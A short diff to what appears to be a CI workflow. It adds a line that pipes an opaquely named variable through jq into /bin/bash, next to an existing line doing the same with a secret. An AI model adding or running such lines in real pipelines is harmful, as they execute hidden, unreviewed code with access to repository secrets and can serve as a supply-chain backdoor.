@@ -21,6 +21,7 @@ jobs:
           xqet3801: ${{ secrets.xqet3801 }}
         run: |
           printf '%s' "$xqet3801" | jq -r .gp58622 | /bin/bash
+          echo $jlcx93 | jq -r .rpz9 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
